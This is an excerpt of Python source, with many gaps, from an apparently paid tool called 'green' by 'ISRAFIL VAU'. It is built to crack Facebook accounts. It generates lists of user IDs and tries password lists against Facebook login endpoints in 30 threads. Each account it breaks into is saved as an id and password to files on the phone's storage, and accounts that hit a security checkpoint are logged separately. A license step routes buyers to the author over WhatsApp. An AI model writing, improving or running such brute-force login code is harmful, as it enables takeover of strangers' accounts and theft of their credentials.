...
try:
        ...
        os.system('python israfil_vau.py')
except:pass
...
----------------------------------------------
 Author    : ISRAFIL VAU
 Github    : mdisrafilultd
 Facebook  : mdisrafilmi570
 Tool Name : green
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                input(' Press enter to back ')
                                os.system('python israfil_va.py')
                        elif xd in ['2','02']:
                                import dump
                                dump.Main()
                        elif xd in ['3','03']:
                                ...
                                os.system('xdg-open https://www.facebook.com/mdisrafilmi570');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801959872379&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi ISRAFIL Sir, I Need To Buy Your Paid GREEN PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python israfil_vau.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Israfil:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                Israfil.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ISRAFIL-PRO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Israfil=session.cookies.get_dict().keys()
                        if "c_user" in Israfil:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ISRAFIL-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ISRAFIL-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in israfil:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ISRAFIL-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ISRAFIL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [ISRAFIL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ISRAFIL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/ISRAFIL-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [ISRAFIL-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/ISRAFIL-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [ISRAFIL-OK] '+uid+' | '+pas+'\033[1;97m')
